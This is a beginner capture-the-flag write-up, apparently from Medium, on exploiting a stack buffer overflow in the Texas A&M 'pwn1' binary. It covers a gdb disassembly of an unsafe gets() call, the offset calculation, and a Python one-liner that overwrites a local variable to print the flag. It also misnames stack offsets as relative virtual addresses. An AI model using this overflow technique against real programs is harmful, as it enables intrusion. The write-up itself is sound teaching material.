From [Medium](https://anee.me/intro-to-pwn-65876c0cb558)
	The binaries and stuff are available
This guide goes through n00b-friendly CTF questions from Texas A&M
# Pwn 1
This is a short binary with a well-known vuln
###### First Run:
```
vagrant@vagrant-ubuntu-trusty-64:/vagrant$ ./pwn1  
This is a super secret program  
Noone is allowed through except for those who know the secret!  
What is my secret?  
AAA  
That is not the secret word!
```
The binary asks for a secret word.
...so what's happening here

Set a breakpoint in `main`
```
vagrant@vagrant-ubuntu-trusty-64:/vagrant$ gdb pwn1  
gdb-peda$ break main  
Breakpoint 1 at 0x80485c0  
gdb-peda$ set disassembly-flavor intel
```
Run and see what happens
```
gdb-peda$ run  
Starting program: /vagrant/pwn1
```

Code:
```
   0x80485bc <main+10>: push ebp  
   0x80485bd <main+11>: mov ebp,esp  
   0x80485bf <main+13>: push ecx  
=> 0x80485c0 <main+14>: sub esp,0x24  
   0x80485c3 <main+17>: mov eax,ds:0x804a030  
   0x80485c8 <main+22>: push 0x0  
   0x80485ca <main+24>: push 0x0  
   0x80485cc <main+26>: push 0x2
```
Registers:
```
EAX: 0x1  
EBX: 0xf7fca000 --> 0x1acda8  
ECX: 0xffffd710 --> 0x1  
EDX: 0xffffd734 --> 0xf7fca000 --> 0x1acda8  
ESI: 0x0  
EDI: 0x0  
EBP: 0xffffd6f8 --> 0x0  
ESP: 0xffffd6f4 --> 0xffffd710 --> 0x1  
EIP: 0x80485c0 (<main+14>: sub esp,0x24)  
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
```
Stack
```
0000| 0xffffd6f4 --> 0xffffd710 --> 0x1
0004| 0xffffd6f8 --> 0x0
0008| 0xffffd6fc --> 0xf7e36af3 (<__libc_start_main+243>: mov    DWORD PTR [esp],eax)
0012| 0xffffd700 --> 0x8048650 (<__libc_csu_init>: push   ebp)
0016| 0xffffd704 --> 0x0
0020| 0xffffd708 --> 0x0
0024| 0xffffd70c --> 0xf7e36af3 (<__libc_start_main+243>: mov    DWORD PTR [esp],eax)
0028| 0xffffd710 --> 0x1
```

Get to breakpoint at main:
```
Breakpoint 1, 0x080485c0 in main ()  
gdb-peda$ disassemble main  
Dump of assembler code for function main:  
   ...ommitted for brevity..
   0x080485bf <+13>: push ecx  
=> 0x080485c0 <+14>: sub esp,0x24  
   ...ommitted for brevity.. 
   0x0804860e <+92>: sub esp,0xc  
   0x08048611 <+95>: lea eax,[ebp-0x23]  
   0x08048614 <+98>: push eax  
   0x08048615 <+99>: call 0x80483d0 <gets@plt>**  
   0x0804861a <+104>: add esp,0x10  
   0x0804861d <+107>: cmp DWORD PTR [ebp-0xc],0xf007ba11  
   0x08048624 <+114>: jne 0x804862d <main+123>  
   0x08048626 <+116>: call 0x804854b <print_flag>  
   0x0804862b <+121>: jmp 0x804863d <main+139>  
   ...omitted for brevity... 
End of assembler dump.  
gdb-peda$
```

The insecure function `get` is called at `0x08048615`. Before the call, the relative virtual address (RVA) `[ebp-0x23]` is loaded onto the stack.
```
   0x08048611 <+95>: lea eax,[ebp-0x23]  
   0x08048614 <+98>: push eax  
   0x08048615 <+99>: call 0x80483d0 <gets@plt>**  
```
This is the first argument to `gets`, the address that the call will write to.

After the call, it checks to see if `ebp-0xc` is equal to `0xf007ba11`
To solve the challenge, we need to overwrite `ebp-0xc` to the required value.

To find the offset between two RVAs, subtract them.
```
  [Write Address] - [CMP Address]
= [ebp-0x23] - [ebp-0xc]
= 0x23 - 0xc = 35 - 12
= 23
```
So anything we enter after 23 characters will go into `ebp-0xc`

Exploit:
```python
$ python -c 'print "AAAAAAAAAAAAAAAAAAAAAAA\x11\xba\x07\xf0"' | ./pwn1
```